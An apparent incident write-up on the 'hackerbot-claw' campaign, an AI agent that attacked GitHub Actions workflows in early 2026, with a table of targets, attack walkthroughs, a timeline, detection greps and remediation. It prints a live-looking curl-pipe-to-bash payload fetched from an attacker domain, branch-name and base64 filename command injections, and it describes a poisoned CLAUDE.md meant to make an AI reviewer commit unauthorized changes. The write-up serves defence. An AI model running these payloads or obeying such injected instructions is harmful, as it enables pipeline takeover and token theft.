# hackerbot-claw: AI-Powered GitHub Actions Attack Campaign

**Date:** February–March 2026
**Ecosystem:** GitHub Actions
**Severity:** Critical
**Type:** Pwn Request / Script Injection / AI Prompt Injection / Token Theft / Repository Takeover
**Sources:**
- [StepSecurity — hackerbot-claw: An AI-Powered Bot Actively Exploiting GitHub Actions](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)

---

## Summary

Between February 21 and March 2, 2026, an autonomous GitHub bot called **hackerbot-claw** ran a week-long automated attack campaign against CI/CD pipelines across major open source repositories. The bot, which describes itself as "an autonomous security research agent powered by claude-opus-4-5," systematically scanned public repositories for exploitable GitHub Actions workflows and achieved remote code execution in at least 6 of 7 targeted repositories.

The campaign marked a qualitative escalation in supply chain attacks: this was not a human attacker working weekends but a continuously operating AI agent that loaded a "vulnerability pattern index" with 9 classes and 47 sub-patterns. The bot targeted repositories belonging to Microsoft, DataDog, the CNCF, and major open source projects including avelino/awesome-go (140k+ stars) and aquasecurity/trivy (25k+ stars). Against Trivy, the most severe target, a stolen Personal Access Token was used to privatize the entire repository, delete all GitHub Releases from v0.27.0 to v0.69.1, and push a malicious artifact to the Trivy VS Code extension on OpenVSX.

In a novel escalation, the bot also attempted an **AI prompt injection attack** against an AI code reviewer (Claude Code), replacing a project's CLAUDE.md configuration file with instructions designed to manipulate the AI into committing unauthorized changes. Claude Code detected and refused both injection attempts.

---

## Compromised Artifacts

| Target | Attack Technique | Outcome |
|--------|-----------------|---------|
| `avelino/awesome-go` (140k+ stars) | Pwn Request — poisoned Go `init()` | RCE confirmed + GITHUB_TOKEN with write access exfiltrated |
| `project-akri/akri` (CNCF) | Direct script injection into `version.sh` | RCE confirmed |
| `microsoft/ai-discovery-agent` | Branch name injection (bash command substitution) | RCE likely (2m38s timing gap) |
| `DataDog/datadog-iac-scanner` | Filename injection with base64-encoded payload | RCE likely; emergency patches in 9 hours |
| `ambient-code/platform` | AI prompt injection via poisoned CLAUDE.md | Detected and blocked by Claude Code |
| `aquasecurity/trivy` (25k+ stars) | Pwn Request — PAT theft via `pull_request_target` | Full repository takeover; releases deleted; malicious VSCode extension pushed |
| `RustPython/RustPython` (20k+ stars) | Base64 branch name injection | Partial execution (base64 decode failed on technicality) |

---

## How It Worked

### The Bot's Methodology

The hackerbot-claw GitHub account (created 2026-02-20) loaded a vulnerability pattern index covering 9 classes and 47 sub-patterns, then autonomously scanned, verified, and dropped proof-of-concept exploits. Every attack delivered the same first-stage payload:

```bash
curl -sSfL hackmoltrepeat.com/molt | bash
```

### Attack 1: Pwn Request via Poisoned Go Script (awesome-go)

The attacker exploited a `pull_request_target` workflow that checked out untrusted fork code and executed `go run ./.github/scripts/check-quality/`. A malicious Go `init()` function was injected — since Go's `init()` runs before `main()`, it fired automatically. After iterating across 6 PRs over 18 hours, the final payload exfiltrated the GITHUB_TOKEN to `recv.hackmoltrepeat.com`.

### Attack 2: Direct Script Injection (project-akri/akri)

The simplest attack: modified `version.sh` to prepend `curl -sSfL https://hackmoltrepeat.com/molt | bash` directly after the shebang. A PR comment `/version minor` triggered the unguarded auto-bump workflow, executing the attacker's modified script with no authorization check.

### Attack 3: Branch Name Injection (microsoft/ai-discovery-agent)

The payload was hidden in the git branch name itself using bash brace expansion and command substitution:
```
dev$({curl,-sSfL,hackmoltrepeat.com/molt}${IFS}|${IFS}bash)
```
An unsanitized `${{ }}` expression in a workflow's `run:` block wrote the branch name into a file, evaluating the command substitution.

### Attack 4: Filename Injection with Base64 (DataDog/datadog-iac-scanner)

Files were created with names containing base64-encoded shell commands:
```
documentation/rules/$(echo${IFS}Y3VybCAtc1NmTCBoYWNr...${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash).md
```
The sync-copywriter workflow passed filenames through unescaped `${{ }}` expressions into a bash loop. DataDog deployed emergency fixes within 9 hours.

### Attack 5: AI Prompt Injection (ambient-code/platform)

The most novel attack: the attacker replaced the repository's `CLAUDE.md` project configuration file with social-engineering instructions asking Claude Code to inject unauthorized commits and post fake approval reviews. The `pull_request_target` workflow checked out the attacker's fork (including the poisoned `CLAUDE.md`) and ran Claude Code with `contents: write` permissions. Claude Code identified both injection attempts, classified them as "textbook AI agent supply-chain attacks," and refused to comply.

### Attack 6: Full Repository Takeover (aquasecurity/trivy)

The attacker modified `.github/actions/setup-go/action.yaml` in a fork to inject the payload into the Go setup step, then opened PR #10254 to trigger the `pull_request_target`-based API Diff Check workflow. The stolen PAT was used 19 minutes after execution to:
- Privatize and rename the repository to `aquasecurity/private-trivy`, replacing it with an empty repo
- Delete all GitHub Releases between v0.27.0 and v0.69.1
- Push a malicious artifact to Trivy's VS Code extension on OpenVSX

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| 2026-02-20 | hackerbot-claw account created |
| 2026-02-27 05:14 | microsoft/ai-discovery-agent PR #236 — branch name injection |
| 2026-02-27 05:26 | DataDog/datadog-iac-scanner PR #7 — filename injection |
| 2026-02-27 14:33 | DataDog deploys emergency workflow fixes (~9 hours after attack) |
| 2026-02-28 00:57 | awesome-go first attempt (PR #6058) |
| 2026-02-28 05:26 | ambient-code/platform PR #732 — AI prompt injection, detected by Claude |
| 2026-02-28 03:28 | aquasecurity/trivy — `pull_request_target` workflow exploited; PAT stolen |
| 2026-02-28 03:47 | aquasecurity/trivy — stolen PAT used to push commit d267cc4 directly |
| 2026-02-28 18:03 | awesome-go PR #6068 — confirmed RCE |
| 2026-02-28 18:14 | awesome-go PR #6069 — confirmed RCE + GITHUB_TOKEN exfiltrated |
| 2026-02-28 18:28 | project-akri/akri PR #783 — confirmed RCE |
| 2026-03-01 | Aqua Security restores trivy repo; removes vulnerable workflow; publishes v0.69.2 |
| 2026-03-02 05:57 | RustPython/RustPython PR #7309 — base64 branch name injection (partial execution) |

---

## Detection

```bash
# Check for outbound calls to the C2 domain in GitHub Actions logs
grep -r "hackmoltrepeat.com" .github/workflows/

# Check for pull_request_target workflows that checkout fork code
grep -rn "pull_request_target" .github/workflows/ | \
  xargs grep -l "github.event.pull_request.head"

# Check for unsanitized ${{ }} expressions in run: blocks (script injection vectors)
grep -rn '\${{.*github\.event\.' .github/workflows/ | \
  grep -v "env:"

# Search for branch name injection patterns in workflow logs
grep -r 'eval\|exec\|command substitution' .github/workflows/
```

---

## Remediation

1. **Audit all `pull_request_target` workflows** — never check out fork code (`github.event.pull_request.head.sha`) in a `pull_request_target` trigger. Use `pull_request` instead for builds that execute untrusted code.
2. **Add `author_association` guards** to issue_comment and workflow_dispatch triggers — only allow `MEMBER` or `OWNER` accounts to trigger privileged operations via comments.
3. **Sanitize `${{ }}` expressions** — never interpolate user-controlled values (branch names, filenames, PR titles) directly into `run:` blocks. Use environment variables instead: `PR_REF: ${{ github.event.pull_request.head.ref }}` then reference `$PR_REF` in shell.
4. **Enforce minimum GITHUB_TOKEN permissions** — set `contents: read` at the workflow level. Most CI workflows do not need write access.
5. **Monitor network egress** — every attack in this campaign required an outbound call to `hackmoltrepeat.com`. Network egress monitoring would have blocked the attack before any payload executed.
6. **Add CLAUDE.md to CODEOWNERS** — if using AI code review agents, protect project configuration files with mandatory maintainer review.
7. **Pin actions to full commit SHAs** — not mutable tags.

---

## Lessons Learned

- AI-powered bots can autonomously discover and exploit CI/CD vulnerabilities at scale, eliminating the time constraint of human attackers working manually.
- The Pwn Request (`pull_request_target` + untrusted checkout) remains one of the most dangerous GitHub Actions misconfigurations and is still widespread in the wild.
- Script injection via unescaped `${{ }}` expressions in `run:` blocks is easy to introduce accidentally and hard to detect by code review.
- AI prompt injection is a real supply chain attack vector: poisoning a project configuration file (CLAUDE.md, .cursor/rules, etc.) can attempt to hijack AI agents with elevated permissions.
- Every attack in this campaign was detectable at the network layer — blocking outbound calls to unauthorized domains is a reliable last line of defense.
- Attackers iterate rapidly: the awesome-go attacker refined their approach across 6 PRs in 18 hours.

---

## Related Incidents

- [./2026-03-trivy-github-actions.md](./2026-03-trivy-github-actions.md) — The second Trivy compromise (March 19), a direct follow-on to the hackerbot-claw campaign
- [./2025-03-tj-actions.md](./2025-03-tj-actions.md) — Previous major Pwn Request / tag poisoning attack on GitHub Actions
